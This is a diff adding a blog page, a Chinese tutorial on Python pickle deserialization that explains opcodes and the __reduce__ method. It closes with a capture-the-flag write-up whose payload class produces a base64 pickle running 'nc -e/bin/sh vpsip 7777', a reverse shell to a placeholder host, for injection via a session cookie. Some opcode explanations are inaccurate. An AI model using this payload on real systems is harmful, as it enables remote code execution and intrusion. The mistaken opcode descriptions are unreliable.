@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <title>Python Pickle反序列化 | Bubble&#39;s blog</title>
+
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    
+<meta name="viewport" content="width=device-width,minimum-scale=1">
+<meta name="description" content="">
+<meta name="generator" content="Hugo 0.128.2">
+
+
+  <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+
+ 
+  
+  
+    
+      <script async src="https://www.googletagmanager.com/gtag/js?id=your-google-analytics-id"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'your-google-analytics-id');
+        }
+      </script>
+    
+  
+
+
+
+
+
+
+
+
+
+  </head>
+
+  <body>
+    <nav class="navigation">
+    
+        <a href="/"> <span class="arrow">←</span>Home</a>
+    
+    <a href="/posts">Archive</a>
+    <a href="/tags">Tags</a>
+    <a href="/about">About</a>
+    <a href="/friend">friend</a>
+
+    
+
+    
+        
+        
+    
+</nav>
+
+
+    <main class="main">
+      
+
+<section id="single">
+    <h1 class="title">Python Pickle反序列化</h1>
+
+    <div class="tip">
+        <time datetime="0001-01-01 00:00:00 &#43;0000 UTC">Jan 1, 0001</time>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          2088 words
+        </span>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          5 minute read
+        </span>
+    </div>
+
+    
+    
+        
+  
+
+
+    
+
+
+    <div class="content">
+      <h2 id="pickle模块介绍python-中的-pickle-模块实现了基本的数据序列化和反序列化序列化是指将数据结构或对象状态转换为可以存储或传输的格式的过程而反序列化则是这个过程的逆操作即将存储或传输的格式恢复回原始的数据结构或对象状态pickle-模块特别适用于-python-对象它可以将几乎任何-python-对象序列化为字节流并能够将这个字节流反序列化为原始对象"><strong>pickle模块介绍</strong>：Python 中的 pickle 模块实现了基本的数据序列化和反序列化。序列化是指将数据结构或对象状态转换为可以存储或传输的格式的过程，而反序列化则是这个过程的逆操作，即将存储或传输的格式恢复回原始的数据结构或对象状态。pickle 模块特别适用于 Python 对象，它可以将几乎任何 Python 对象序列化为字节流，并能够将这个字节流反序列化为原始对象。 <a href="#pickle%e6%a8%a1%e5%9d%97%e4%bb%8b%e7%bb%8dpython-%e4%b8%ad%e7%9a%84-pickle-%e6%a8%a1%e5%9d%97%e5%ae%9e%e7%8e%b0%e4%ba%86%e5%9f%ba%e6%9c%ac%e7%9a%84%e6%95%b0%e6%8d%ae%e5%ba%8f%e5%88%97%e5%8c%96%e5%92%8c%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%ba%8f%e5%88%97%e5%8c%96%e6%98%af%e6%8c%87%e5%b0%86%e6%95%b0%e6%8d%ae%e7%bb%93%e6%9e%84%e6%88%96%e5%af%b9%e8%b1%a1%e7%8a%b6%e6%80%81%e8%bd%ac%e6%8d%a2%e4%b8%ba%e5%8f%af%e4%bb%a5%e5%ad%98%e5%82%a8%e6%88%96%e4%bc%a0%e8%be%93%e7%9a%84%e6%a0%bc%e5%bc%8f%e7%9a%84%e8%bf%87%e7%a8%8b%e8%80%8c%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%88%99%e6%98%af%e8%bf%99%e4%b8%aa%e8%bf%87%e7%a8%8b%e7%9a%84%e9%80%86%e6%93%8d%e4%bd%9c%e5%8d%b3%e5%b0%86%e5%ad%98%e5%82%a8%e6%88%96%e4%bc%a0%e8%be%93%e7%9a%84%e6%a0%bc%e5%bc%8f%e6%81%a2%e5%a4%8d%e5%9b%9e%e5%8e%9f%e5%a7%8b%e7%9a%84%e6%95%b0%e6%8d%ae%e7%bb%93%e6%9e%84%e6%88%96%e5%af%b9%e8%b1%a1%e7%8a%b6%e6%80%81pickle-%e6%a8%a1%e5%9d%97%e7%89%b9%e5%88%ab%e9%80%82%e7%94%a8%e4%ba%8e-python-%e5%af%b9%e8%b1%a1%e5%ae%83%e5%8f%af%e4%bb%a5%e5%b0%86%e5%87%a0%e4%b9%8e%e4%bb%bb%e4%bd%95-python-%e5%af%b9%e8%b1%a1%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%ba%e5%ad%97%e8%8a%82%e6%b5%81%e5%b9%b6%e8%83%bd%e5%a4%9f%e5%b0%86%e8%bf%99%e4%b8%aa%e5%ad%97%e8%8a%82%e6%b5%81%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%ba%e5%8e%9f%e5%a7%8b%e5%af%b9%e8%b1%a1" class="anchor">🔗</a></h2><h2 id="主要函数"><strong>主要函数</strong>： <a href="#%e4%b8%bb%e8%a6%81%e5%87%bd%e6%95%b0" class="anchor">🔗</a></h2><ol>
+<li><code>pickle.dump(obj, file[, protocol])</code>:</li>
+</ol>
+<p>　　序列化对象，并将结果数据流写入到文件对象中。参数<code>protocol</code>是序列化模式，默认值为0，表示以文本的形式序列化。protocol的值还可以是1或2，表示以二进制的形式序列化。</p>
+<ol start="2">
+<li>
+<p><code>pickle.load(file)</code>
+　　反序列化对象。将文件中的数据解析为一个Python对象。</p>
+</li>
+<li>
+<p><code> pickle.dumps(obj)：</code>
+把 obj 对象序列化后以<code>bytes</code>对象返回，不写入文件</p>
+</li>
+<li>
+<p><code>pickle.loads(bytes_object)：</code>
+从 bytes 对象中读取一个反序列化对象，并返回其重组后的对象</p>
+</li>
+</ol>
+<h2 id="pickle反序列化实例"><strong>pickle反序列化实例</strong> <a href="#pickle%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%ae%9e%e4%be%8b" class="anchor">🔗</a></h2><p><strong>简单字节的反序列化</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">pickle</span>  
+</span></span><span style="display:flex;"><span>serialized_bytes <span style="color:#666">=</span> pickle<span style="color:#666">.</span>dumps(<span style="color:#b44">&#39;bubble&#39;</span>)  <span style="color:#080;font-style:italic"># 将整数42序列化为字节流  </span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(serialized_bytes)  
+</span></span><span style="display:flex;"><span>unserialized_object <span style="color:#666">=</span> pickle<span style="color:#666">.</span>loads(serialized_bytes)   <span style="color:#080;font-style:italic">#反序列化</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(unserialized_object)
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(<span style="color:#a2f">type</span>(unserialized_object))  
+</span></span></code></pre></div><p>输出：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>b&#39;\x80\x04\x95\n\x00\x00\x00\x00\x00\x00\x00\x8c\x06bubble\x94.&#39;
+</span></span><span style="display:flex;"><span>bubble
+</span></span><span style="display:flex;"><span>&lt;class &#39;str&#39;&gt;
+</span></span></code></pre></div><p>对于<code>b'\x80\x04\x95\n\x00\x00\x00\x00\x00\x00\x00\x8c\x06bubble\x94.'</code>:</p>
+<ol>
+<li>
+<p><code>b'\x80\x04'：</code>这是 pickle 协议的版本标记,\x04表示版本为4。</p>
+</li>
+<li>
+<p><code>\x95\n\x00\x00\x00\x00\x00\x00\x00：</code>这部分是一个长度前缀，\x95 是 pickle 中表示“BINSTRING”（二进制字符串）的 opcode，\n（即十进制的 10）表示接下来要读取的字符串长度（在这个例子中是 6 个字节，即 &ldquo;bubble&rdquo; 的长度）。后面的<code> \x00\x00\x00\x00\x00\x00\x00</code> 是填充字节，用于对齐到 8 字节边界。</p>
+</li>
+<li>
+<p><code>\x8c\x06bubble：</code>\x8c 是另一个表示字符串的 opcode（与 \x95 不同，它用于较短的字符串），\x06 表示字符串的长度，紧接着是字符串 &ldquo;bubble&rdquo; 的 ASCII 编码。</p>
+</li>
+<li>
+<p><code>\x94：</code>这是 pickle 中的 STOP opcode，表示序列化数据的结束</p>
+</li>
+</ol>
+<p><strong>类的反序列化</strong></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">pickle</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">BUBBLE</span>:
+</span></span><span style="display:flex;"><span>    ops<span style="color:#666">=</span><span style="color:#b44">&#39;hi&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">#当创建一个类的实例并调用其方法时，Python会自动将实例本身作为第一个参数传递给该方法，这个参数在方法内部通常被命名为self</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">test</span>(self):
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">return</span> self<span style="color:#666">.</span>ops
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>obj<span style="color:#666">=</span>BUBBLE()
+</span></span><span style="display:flex;"><span>p1<span style="color:#666">=</span>pickle<span style="color:#666">.</span>dumps(obj) <span style="color:#080;font-style:italic">#序列化</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(p1)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p2<span style="color:#666">=</span>pickle<span style="color:#666">.</span>loads(p1) <span style="color:#080;font-style:italic">#反序列化</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(p2)
+</span></span></code></pre></div><p>输出：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>b&#39;\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06BUBBLE\x94\x93\x94)\x81\x94.&#39;
+</span></span><span style="display:flex;"><span>&lt;__main__.BUBBLE object at 0x0000029DEFE0A0D0&gt;
+</span></span></code></pre></div><ol>
+<li>
+<p><code>b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00'：</code>这部分是pickle协议版本和对象长度的头部信息</p>
+</li>
+<li>
+<p><code>\x8c\x08__main__\x94：</code>这部分表示一个字符串对象，\x8c是pickle中用于表示短字符串的opcode，\x08是字符串长度的字节表示（8，即__main__的长度），__main__是字符串本身，\x94表示字符串的结束。</p>
+</li>
+<li>
+<p><code> ) ：</code>在栈上建立一个新的tuple，这个tuple存储的是新建对象时需要提供的参数，因为本例中不需要参数，所以这个tuple为空</p>
+</li>
+<li>
+<p><code>\x81：</code>操作符，该操作符调用<code>cls.__new__</code>方法来建立对象，该方法接受前面tuple中的参数，本例中为空。</p>
+</li>
+<li>
+<p>使用pickle模块直接打印反序列化后的对象时，看到的是对象的表示（通常是一个内存地址而不是对象内部属性的直接输出。</p>
+</li>
+</ol>
+<p>如果要在反序列化后看到ops的值，可以通过以下方法来实现：</p>
+<p><strong>方法1：定义__repr__或__str__方法</strong></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">pickle</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">BUBBLE</span>:
+</span></span><span style="display:flex;"><span>    ops<span style="color:#666">=</span><span style="color:#b44">&#39;hi&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">test</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">return</span> self<span style="color:#666">.</span>ops
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">def</span> __repr__(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#b44">f</span><span style="color:#b44">&#34;BUBBLE(ops=</span><span style="color:#b68;font-weight:bold">{</span>self<span style="color:#666">.</span>ops<span style="color:#b68;font-weight:bold">}</span><span style="color:#b44">)&#34;</span><span style="color:#080;font-style:italic">#在Python中，f 或 F 前缀在字符串字面量中使用时，表示这是一个格式化字符串字面量（也称为f-string）,f-string允许你在字符串中嵌入表达式，这些表达式会被其值所替换。</span>
+</span></span><span style="display:flex;"><span>obj<span style="color:#666">=</span>BUBBLE()
+</span></span><span style="display:flex;"><span>p1<span style="color:#666">=</span>pickle<span style="color:#666">.</span>dumps(obj) <span style="color:#080;font-style:italic">#序列化</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(p1)
+</span></span><span style="display:flex;"><span>p2<span style="color:#666">=</span>pickle<span style="color:#666">.</span>loads(p1) <span style="color:#080;font-style:italic">#反序列化</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(p2)
+</span></span></code></pre></div><p>输出：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>b&#39;\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06BUBBLE\x94\x93\x94)\x81\x94.&#39;
+</span></span><span style="display:flex;"><span>BUBBLE(ops=hi)
+</span></span></code></pre></div><p><strong>方法2：直接访问对象的属性</strong></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">pickle</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">BUBBLE</span>:
+</span></span><span style="display:flex;"><span>    ops<span style="color:#666">=</span><span style="color:#b44">&#39;hi&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">test</span>(self):
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">return</span> self<span style="color:#666">.</span>ops
+</span></span><span style="display:flex;"><span>obj<span style="color:#666">=</span>BUBBLE()
+</span></span><span style="display:flex;"><span>p1<span style="color:#666">=</span>pickle<span style="color:#666">.</span>dumps(obj) <span style="color:#080;font-style:italic">#序列化</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(p1)
+</span></span><span style="display:flex;"><span>p2<span style="color:#666">=</span>pickle<span style="color:#666">.</span>loads(p1) <span style="color:#080;font-style:italic">#反序列化</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(p2<span style="color:#666">.</span>ops)
+</span></span></code></pre></div><p>输出：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>b&#39;\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06BUBBLE\x94\x93\x94)\x81\x94.&#39;
+</span></span><span style="display:flex;"><span>hi
+</span></span></code></pre></div><p><strong>__reduce__介绍</strong></p>
+<p><code>__reduce__ </code>方法允许你自定义一个对象如何被 pickle 序列化。这个魔术方法跟php的<code>__wakeup</code>差不多,就是在被序列化的时候告诉系统如何运行,但<code>__reduce__</code>内容可控制，而php的<code>__wakeup</code>则是目标环境写死。</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">pickle</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Cover</span>():
+</span></span><span style="display:flex;"><span>    text<span style="color:#666">=</span><span style="color:#b44">&#34;123&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">def</span> __init__(self,text):
+</span></span><span style="display:flex;"><span>        self<span style="color:#666">.</span>text<span style="color:#666">=</span>text
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">__reduce__</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">return</span> (Cover,(<span style="color:#b44">&#34;bubble&#34;</span>,))
+</span></span><span style="display:flex;"><span>text<span style="color:#666">=</span>Cover(<span style="color:#b44">&#39;blow&#39;</span>)
+</span></span><span style="display:flex;"><span>p1<span style="color:#666">=</span>pickle<span style="color:#666">.</span>dumps(text)
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(p1)    
+</span></span><span style="display:flex;"><span>p2<span style="color:#666">=</span>pickle<span style="color:#666">.</span>loads(p1)
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(p2<span style="color:#666">.</span>text)
+</span></span></code></pre></div><p>可以看到输出字符串是bubble</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>b&#39;\x80\x04\x95#\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x05Cover\x94\x93\x94\x8c\x06bubble\x94\x85\x94R\x94.&#39;
+</span></span><span style="display:flex;"><span>bubble
+</span></span></code></pre></div><p>序列化一个对象时，如果该类定义了 <code>__reduce__</code> 方法，pickle 会调用这个方法而不是尝试直接序列化对象的所有属性。该方法不带任何参数，并且应返回字符串或者一个元组，该元组的<strong>第一个元素是一个函数</strong>（或任何可调用对象，返回的对象通常称为reduce值），该函数的调用将重新创建对象，元组的<strong>其余元素是该函数所需的参数</strong>。</p>
+<p><strong>__reduce__的返回值是tuple类型时就可以实现任意代码执行</strong></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">os</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">pickle</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">A</span>(<span style="color:#a2f">object</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">__reduce__</span>(self):
+</span></span><span style="display:flex;"><span>        cmd<span style="color:#666">=</span><span style="color:#b44">&#34;whoami&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">return</span> (os<span style="color:#666">.</span>system,(cmd,))
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>a<span style="color:#666">=</span>A()
+</span></span><span style="display:flex;"><span>p<span style="color:#666">=</span>pickle<span style="color:#666">.</span>dumps(a)
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(p)
+</span></span><span style="display:flex;"><span>pickle<span style="color:#666">.</span>loads(p)
+</span></span></code></pre></div><p>可以看到执行反序列化操作后触发代码执行：</p>
+<p><p class="markdown-image">
+  <img src="/img/71.png" alt="alt text"  />
+</p></p>
+<p><strong>例题：[watevrCTF-2019]Pickle Store</strong></p>
+<p>打开题目如图：</p>
+<p><p class="markdown-image">
+  <img src="/img/72.png" alt="alt text"  />
+</p></p>
+<p>抓个包看看：</p>
+<p><p class="markdown-image">
+  <img src="/img/73.png" alt="alt text"  />
+</p></p>
+<p>看到有个cookie,base64解码得到一堆乱码：</p>
+<p><p class="markdown-image">
+  <img src="/img/74.png" alt="alt text"  />
+</p></p>
+<p>结合题目提示知道考点是<code>python pickle</code>反序列化，也就是说cookie的内容是信息被序列化后经过base64加密得来的。</p>
+<p>反弹shell:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">base64</span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">pickle</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">A</span>(<span style="color:#a2f">object</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">__reduce__</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">return</span> (<span style="color:#a2f">eval</span>, (<span style="color:#b44">&#34;__import__(&#39;os&#39;).system(&#39;nc -e/bin/sh vpsip 7777&#39;)&#34;</span>,))
+</span></span><span style="display:flex;"><span>a <span style="color:#666">=</span> A()
+</span></span><span style="display:flex;"><span><span style="color:#a2f">print</span>(base64<span style="color:#666">.</span>b64encode(pickle<span style="color:#666">.</span>dumps(a)))
+</span></span></code></pre></div><p>靶机开启监听，将得到的字符串放入session中，就可以成功反弹shell啦！</p>
+<p><p class="markdown-image">
+  <img src="/img/75.png" alt="alt text"  />
+</p></p>
+<p>[https://blog.csdn.net/snowlyzz/article/details/126633170?spm=1001.2101.3001.6650.4&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-4-126633170-blog-116274988.235%5Ev43%5Epc_blog_bottom_relevance_base3&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-4-126633170-blog-116274988.235%5Ev43%5Epc_blog_bottom_relevance_base3&amp;utm_relevant_index=8]</p>
+    </div>
+
+    
+    
+    
+  <div id="comment">
+    
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "your-disqus-shortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+  </div>
+
+
+</section>
+
+
+    </main>
+    
+    <footer id="footer">
+    
+        <div id="social">
+
+
+    <a class="symbol" href="https://github.com/bubbleo0O" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    
+    <title>Github</title>
+    <desc>Created with Sketch.</desc>
+    <defs></defs>
+    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
+            <g id="Github" transform="translate(264.000000, 939.000000)">
+                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
+                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
+            </g>
+        </g>
+    </g>
+</svg>
+    </a>
+
+    <a class="symbol" href="your-stackoverflow-link" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28" viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    
+    <title>stackoverflow</title>
+    <desc>Created with Sketch.</desc>
+    <defs></defs>
+    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Social-Icons---Rounded-Black" transform="translate(-488.000000, -1163.000000)">
+            <g id="stackoverflow" transform="translate(488.000000, 1163.000000)">
+                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
+                <path d="M42.0860128,53.5922927 L22.9745951,53.6011499 L22.9729497,49.5538824 L42.0835447,49.5440929 L42.0860128,53.5922927 L42.0860128,53.5922927 Z M55,30.6708298 L51.7306912,12 L47.7087256,12.6920259 L50.9775643,31.3628557 L55,30.6708298 L55,30.6708298 Z M42.5455518,44.3547147 L23.5156994,42.616026 L23.1410164,46.6470941 L42.1712214,48.3841513 L42.5455518,44.3547147 L42.5455518,44.3547147 Z M43.8009984,39.0731519 L25.3459811,34.1539179 L24.285633,38.0621508 L42.7419431,42.9819676 L43.8009984,39.0731519 L43.8009984,39.0731519 Z M46.2103463,34.4436411 L29.7494464,24.8164635 L27.6748215,28.3015328 L44.1365441,37.9292931 L46.2103463,34.4436411 L46.2103463,34.4436411 Z M50.2466504,31.6088756 L46.8745036,33.8883189 L36.106599,18.2318456 L39.4792159,15.9517031 L50.2466504,31.6088756 Z M45.3315807,40.2784283 L48.5799693,40.2784283 L48.5799693,60 L17,60 L17,40.2784283 L20.2648427,40.2784283 L20.2648427,56.8243495 L45.3315807,56.8243495 L45.3315807,40.2784283 Z" fill="#FFFFFF"></path>
+            </g>
+        </g>
+    </g>
+</svg>
+    </a>
+
+    <a class="symbol" href="your-twitter-link" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
+	 xml:space="preserve">
+<g>
+	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
+		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
+		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
+		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
+		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
+		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
+		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
